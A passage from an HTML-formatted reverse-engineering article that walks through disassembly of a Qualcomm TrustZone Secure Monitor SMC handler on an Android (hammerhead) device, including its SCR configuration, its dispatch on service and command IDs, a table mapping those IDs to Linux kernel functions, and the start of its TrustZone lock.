&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D02C&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; read SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D030&lt;/span&gt;                 &lt;span class="no"&gt;TST&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1  ; test SCR.NS bit&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D034&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D210&lt;/span&gt; &lt;span class="c1"&gt;; jump if SCR.NS==0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When an exception is taken to the Monitor mode, CPSR.{A,I, F} bits
are set to 1, meaning Abort, IRQ and FIQ exceptions can no longer
be taken.&lt;/p&gt;
&lt;h3&gt;IV.3.A. Call to Secure World&lt;/h3&gt;

&lt;p&gt;If SCR.NS bit is set, it means the Non-Secure world wants to call
the Secure world. We will now analyze the operations performed by
the SMC handler until the exception return to the Secure world.&lt;br&gt;
&lt;h5&gt;IV.3.A.a Setup current security state&lt;/h5&gt;
This first step configures the Secure Configuration Register (SCR).
Bits&amp;lt;1:3&amp;gt; (SCR.IRQ || SCR.FIQ || SCR.EA) are set to route
IRQ, FIQ, and External Abort exceptions to Monitor mode. But the
Non-Secure bit&amp;lt;0&amp;gt; is not set. So, this core will still be in
the Secure state if it exits Monitor mode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D038&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_IRQ OR SCR_FIQ OR SCR_EA ; 0b1110&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D03C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR with SCR.NS==0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D040&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; Instruction Synchronization Barrier&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D040&lt;/span&gt;                                         &lt;span class="c1"&gt;; flushes the pipeline in the processor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.A.b Monitor calls&lt;/h5&gt;

&lt;p&gt;On a HLOS like Android, SMC exceptions are triggered by the
&lt;a href="https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/scm.c"&gt;
Secure Channel Manager (SCM), implemented in Linux kernel&lt;/a&gt;.&lt;br&gt;
A quick look at its source code tells us {R0-R3} registers hold
arguments of SMC calls. We also learn that R0 is a bitfield that
can be defined by the following macro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SCM_ATOMIC(svc, cmd, n) (((((svc) &amp;lt;&amp;lt; 10)|((cmd) &amp;amp; 0x3ff)) &amp;lt;&amp;lt; 12) | \&lt;/span&gt;
&lt;span class="cp"&gt;    SCM_CLASS_REGISTER | \&lt;/span&gt;
&lt;span class="cp"&gt;    SCM_MASK_IRQS | \&lt;/span&gt;
&lt;span class="cp"&gt;    (n &amp;amp; 0xf))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With svc the service identifier, cmd the command identifier, and n
the argument count of the SMC call.&lt;br&gt;
&lt;br&gt;
In SMC handler, R0 value is first shifted right by 12. Based on the
SCM_ATOMIC macro definition, resulting R0 value represents a
service identifier svc and a command identifier cmd defined as
((svc) &amp;lt;&amp;lt; 10)|((cmd) &amp;amp; 0x3ff).&lt;br&gt;
Then R0 value is tested against several immediate values. For each
case, a specific function is called if values match.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D048&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSR&lt;/span&gt;&lt;span class="c1"&gt;#12 ; extract service &amp;amp; command identifiers&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D04C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x402 ; SCM_SVC_BOOT::SCM_CMD_TERMINATE_PC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D050&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D054&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D058&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D360&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D05C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xC05 ; SCM_SVC_UTIL::CACHE_BUFFER_DUMP_COMMAND_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D060&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D064&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D068&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D68C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D06C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x404 ; SCM_SVC_BOOT::4&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D070&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D074&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D078&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D72C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D07C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1401 ; SCM_SVC_IO::SCM_IO_READ&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D080&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D084&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D088&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5AC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D08C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1402 ; SCM_SVC_IO::SCM_IO_WRITE&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D090&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D094&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D098&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5CC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D09C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x3404 ; SCM_SVC_DCVS::DCVS_CMD_EVENT&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0A8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D64C&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0AC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1403 ; SCM_SVC_IO::TZ_RESET_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0B8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D5EC&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0BC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1404 ; SCM_SVC_IO::TZ_UPDATE_ID&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0C8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D618&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0CC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x2401 ; SCM_SVC_PWR::SCM_IO_DISABLE_PMIC_ARBITER&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D0&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D4&lt;/span&gt;                 &lt;span class="no"&gt;LDMEQFD&lt;/span&gt;         &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1-R3&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0D8&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;sub_FE80D74C&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As Linux kernel itself initiates a lot of SMC calls, we explore
&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/"&gt;
Linux sources&lt;/a&gt; to enumerate service and command identifiers
passed to SMC calls. Thereby, we will get more information on
corresponding functions without reversing them.&lt;br&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Immediate value&lt;/th&gt;
&lt;th&gt;Service ID (imm&amp;gt;&amp;gt;10)&lt;/th&gt;
&lt;th&gt;Command ID (imm&amp;amp;0x3ff)&lt;/th&gt;
&lt;th&gt;Function description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x402&lt;/td&gt;
&lt;td&gt;SCM_SVC_BOOT&lt;/td&gt;
&lt;td&gt;SCM_CMD_TERMINATE_PC&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/b0650348df9152b11187a65d777d191bcae0817e%5E%21/"&gt;
Put current core in low power state&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xC05&lt;/td&gt;
&lt;td&gt;SCM_SVC_UTIL&lt;/td&gt;
&lt;td&gt;CACHE_BUFFER_DUMP_COMMAND_ID&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/7b63736cd68dac64b889f18d3e9cfa037e12e076%5E%21/"&gt;
Dump the L1 and L2 caches on panic&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x404&lt;/td&gt;
&lt;td&gt;SCM_SVC_BOOT&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1401&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;SCM_IO_READ&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1402&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;SCM_IO_WRITE&lt;/td&gt;
&lt;td&gt;Dummy function, returns to Non-Secure world&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3404&lt;/td&gt;
&lt;td&gt;SCM_SVC_DCVS&lt;/td&gt;
&lt;td&gt;DCVS_CMD_EVENT&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/f53ef1b26b1a06255648e7db5db395d9439af483%5E%21/"&gt;
Handle some Dynamic Clock and Voltage Scaling (DCVS)&lt;/a&gt;&amp;nbsp;See
also&amp;nbsp;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/include/mach/msm_dcvs_scm.h"&gt;event
definitions&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1403&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;TZ_RESET_ID&lt;/td&gt;
&lt;td&gt;Related to GPU power management&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1404&lt;/td&gt;
&lt;td&gt;SCM_SVC_IO&lt;/td&gt;
&lt;td&gt;TZ_UPDATE_ID&lt;/td&gt;
&lt;td&gt;Related to GPU power management&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x2401&lt;/td&gt;
&lt;td&gt;SCM_SVC_PWR&lt;/td&gt;
&lt;td&gt;SCM_IO_DISABLE_PMIC_ARBITER&lt;/td&gt;
&lt;td&gt;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/restart.c"&gt;
"Force the SPMI PMIC arbiter to shutdown so that no more SPMI
transactions are sent from the MSM to the PMIC."&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
All these functions have the same epilogue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D738&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FIQ OR SCR_AW ; 0b100101&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D73C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR : switch to Non-Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D740&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D744&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R3 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D748&lt;/span&gt;                 &lt;span class="no"&gt;MOVS&lt;/span&gt;            &lt;span class="no"&gt;PC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Non-Secure PC &amp;amp; CPSR from LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These instructions switch the processor to Non-Secure state and
restore PC &amp;amp; CPSR to perform an exception return.&lt;br&gt;
&lt;br&gt;
So SMC calls associated with these specific command/service IDs are
kind of "Monitor calls", entirely handled in Monitor mode.&lt;/p&gt;
&lt;p&gt;But if R0 value does not match these IDs, the execution continues
in Monitor mode.&lt;/p&gt;
&lt;h5&gt;IV.3.A.c TrustZone lock&lt;/h5&gt;

&lt;p&gt;If the call has not been handled yet, Monitor code tries to acquire
a lock to ensure that only one core at a time enters in
TrustZone.&lt;/p&gt;
&lt;p&gt;First, current CPU id is retrieved from MPIDR. Then, this value is
incremented (because 0 means not locked) and used as lock
value.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E4&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; read MPIDR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0E8&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; extract Aff0 from MPIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0EC&lt;/span&gt;                 &lt;span class="no"&gt;ADD&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt; &lt;span class="no"&gt;loc_FE80D0F0&lt;/span&gt;                            &lt;span class="c1"&gt;; CODE XREF: smc_handler+D8j&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F0&lt;/span&gt;                 &lt;span class="no"&gt;LDREX&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; read current tz_lock value&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F4&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; test if TrustZone is locked&lt;/span&gt;
